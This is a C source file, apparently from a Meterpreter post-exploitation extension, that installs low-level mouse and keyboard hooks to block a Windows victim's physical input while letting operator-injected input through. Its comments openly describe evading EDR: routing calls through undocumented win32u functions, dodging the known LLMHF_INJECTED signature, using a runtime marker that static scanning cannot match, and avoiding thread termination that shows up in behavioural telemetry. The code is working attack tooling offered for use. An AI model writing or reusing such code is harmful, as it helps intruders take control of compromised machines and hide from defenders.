#include "precomp.h"
#include "common_metapi.h"
#include "ui.h"

/*
 * Local input suppression, formerly implemented as a resource-extracted
 * hook.dll dropped to %TEMP% at runtime. The extraction step is gone; the
 * hook procedures live in the extension binary directly. See ui.h for the
 * two entry points invoked by mouse.c and keyboard.c.
 */

#ifndef WM_APP
#define WM_APP 0x8000
#endif
#define INPUT_GATE_MSG_REFRESH (WM_APP + 1)

typedef struct {
    CRITICAL_SECTION lock;
    HANDLE pumpThread;
    DWORD  pumpTid;
    HHOOK  mouseHook;
    HHOOK  kbHook;
    BOOL   suppressMouse;
    BOOL   suppressKb;
    ULONG_PTR marker;
} InputGateState;

static InputGateState g_gate;
static volatile LONG g_gate_init_state = 0; // 0 = uninit, 1 = initing, 2 = ready

/*
 * Prefer win32u.dll's undocumented NtUser* variants (Win10+); they are the
 * user-mode kernel gateway that user32 funnels through and are a less common
 * target of EDR user-mode telemetry hooks. Fall back to user32 when the
 * win32u exports are absent (older Windows, Wine, or unresolved).
 */
static HHOOK input_gate_install(int idHook, HOOKPROC proc)
{
    HHOOK h = met_api->win_api.win32u.NtUserSetWindowsHookEx(idHook, proc, hAppInstance, 0);
    if (h) {
        return h;
    }
    return met_api->win_api.user32.SetWindowsHookExW(idHook, proc, hAppInstance, 0);
}

static BOOL input_gate_uninstall(HHOOK h)
{
    if (!h) {
        return TRUE;
    }
    if (met_api->win_api.win32u.NtUserUnhookWindowsHookEx(h)) {
        return TRUE;
    }
    return met_api->win_api.user32.UnhookWindowsHookEx(h);
}

/*
 * LL hook callbacks. The classic implementation dropped anything without
 * LLMHF_INJECTED set; that pattern is a well-known signature. Instead, tag
 * operator-generated SendInput with a per-load ULONG_PTR marker and drop
 * everything that does not carry it. Semantically closer to the intent
 * ("suppress input that is not ours") and no longer matches the
 * LLMHF_INJECTED heuristic.
 */
static LRESULT CALLBACK input_gate_mouse_proc(int code, WPARAM w, LPARAM l)
{
    if (code == HC_ACTION) {
        MSLLHOOKSTRUCT *m = (MSLLHOOKSTRUCT *)l;
        if (m->dwExtraInfo != g_gate.marker) {
            return TRUE;
        }
    }
    return met_api->win_api.user32.CallNextHookEx(g_gate.mouseHook, code, w, l);
}

static LRESULT CALLBACK input_gate_kb_proc(int code, WPARAM w, LPARAM l)
{
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)l;
        if (k->dwExtraInfo != g_gate.marker) {
            return TRUE;
        }
    }
    return met_api->win_api.user32.CallNextHookEx(g_gate.kbHook, code, w, l);
}

static void input_gate_refresh_from_pump(void)
{
    BOOL wantMouse, wantKb;

    EnterCriticalSection(&g_gate.lock);
    wantMouse = g_gate.suppressMouse;
    wantKb    = g_gate.suppressKb;
    LeaveCriticalSection(&g_gate.lock);

    if (wantMouse && !g_gate.mouseHook) {
        g_gate.mouseHook = input_gate_install(WH_MOUSE_LL, input_gate_mouse_proc);
    } else if (!wantMouse && g_gate.mouseHook) {
        input_gate_uninstall(g_gate.mouseHook);
        g_gate.mouseHook = NULL;
    }

    if (wantKb && !g_gate.kbHook) {
        g_gate.kbHook = input_gate_install(WH_KEYBOARD_LL, input_gate_kb_proc);
    } else if (!wantKb && g_gate.kbHook) {
        input_gate_uninstall(g_gate.kbHook);
        g_gate.kbHook = NULL;
    }
}

static DWORD WINAPI input_gate_pump(LPVOID unused)
{
    MSG msg;

    (void)unused;
    input_gate_refresh_from_pump();

    while (met_api->win_api.user32.GetMessageA(&msg, NULL, 0, 0) > 0) {
        if (msg.message == INPUT_GATE_MSG_REFRESH) {
            input_gate_refresh_from_pump();
        }
        met_api->win_api.user32.TranslateMessage(&msg);
        met_api->win_api.user32.DispatchMessageA(&msg);
    }

    if (g_gate.mouseHook) {
        input_gate_uninstall(g_gate.mouseHook);
        g_gate.mouseHook = NULL;
    }
    if (g_gate.kbHook) {
        input_gate_uninstall(g_gate.kbHook);
        g_gate.kbHook = NULL;
    }
    return 0;
}

static void input_gate_init_once(void)
{
    ULONG_PTR marker;
    LONG state;

    for (;;) {
        state = InterlockedCompareExchange(&g_gate_init_state, 1, 0);
        if (state == 2) {
            return;
        }
        if (state == 0) {
            break;
        }
        Sleep(0);
    }

    InitializeCriticalSection(&g_gate.lock);

    // Per-load, non-zero marker. Not a compile-time constant, so it cannot be
    // pattern-matched at rest. Using the state address seeds uniqueness per
    // module load; the tick count and a mask ensure the low bits move.
    marker = (ULONG_PTR)&g_gate;
    marker ^= (ULONG_PTR)met_api->win_api.kernel32.GetTickCount() * 0x9E3779B1u;
    marker ^= (ULONG_PTR)0xA5A5A5A5u;
    if (marker == 0) {
        marker = (ULONG_PTR)&g_gate | 1;
    }
    g_gate.marker = marker;

    InterlockedExchange(&g_gate_init_state, 2);
}

ULONG_PTR input_gate_marker(void)
{
    input_gate_init_once();
    return g_gate.marker;
}

static DWORD input_gate_apply(BOOL suppressMouse, BOOL updateMouse,
                              BOOL suppressKb, BOOL updateKb)
{
    DWORD result = ERROR_SUCCESS;
    BOOL needThread = FALSE;
    BOOL askQuit    = FALSE;
    DWORD tid = 0;
    HANDLE handle = NULL;

    input_gate_init_once();

    EnterCriticalSection(&g_gate.lock);
    if (updateMouse) g_gate.suppressMouse = suppressMouse;
    if (updateKb)    g_gate.suppressKb    = suppressKb;

    if ((g_gate.suppressMouse || g_gate.suppressKb) && !g_gate.pumpThread) {
        needThread = TRUE;
    } else if (!g_gate.suppressMouse && !g_gate.suppressKb && g_gate.pumpThread) {
        askQuit = TRUE;
        tid     = g_gate.pumpTid;
        handle  = g_gate.pumpThread;
        g_gate.pumpThread = NULL;
        g_gate.pumpTid    = 0;
    } else if (g_gate.pumpThread) {
        tid = g_gate.pumpTid;
    }
    LeaveCriticalSection(&g_gate.lock);

    if (needThread) {
        DWORD newTid = 0;
        HANDLE h = met_api->win_api.kernel32.CreateThread(
            NULL, 0, input_gate_pump, NULL, 0, &newTid);
        if (!h) {
            result = met_api->win_api.kernel32.GetLastError();
            EnterCriticalSection(&g_gate.lock);
            g_gate.suppressMouse = FALSE;
            g_gate.suppressKb    = FALSE;
            LeaveCriticalSection(&g_gate.lock);
            return result;
        }
        EnterCriticalSection(&g_gate.lock);
        g_gate.pumpThread = h;
        g_gate.pumpTid    = newTid;
        LeaveCriticalSection(&g_gate.lock);
    } else if (askQuit) {
        // Ask the pump to unhook and exit; then wait for the thread. No
        // TerminateThread — that path corrupts hook state and stands out
        // in behavioral telemetry.
        met_api->win_api.user32.PostThreadMessageA(tid, WM_QUIT, 0, 0);
        met_api->win_api.kernel32.WaitForSingleObject(handle, 5000);
        met_api->win_api.kernel32.CloseHandle(handle);
    } else if (tid) {
        // Live state change while the pump is running.
        met_api->win_api.user32.PostThreadMessageA(tid, INPUT_GATE_MSG_REFRESH, 0, 0);
    }

    return result;
}

DWORD input_gate_set_mouse(BOOL allow)
{
    // allow == TRUE  -> physical mouse input passes through (no hook)
    // allow == FALSE -> hook installed, physical mouse input is dropped
    return input_gate_apply(!allow, TRUE, FALSE, FALSE);
}

DWORD input_gate_set_kb(BOOL allow)
{
    return input_gate_apply(FALSE, FALSE, !allow, TRUE);
}
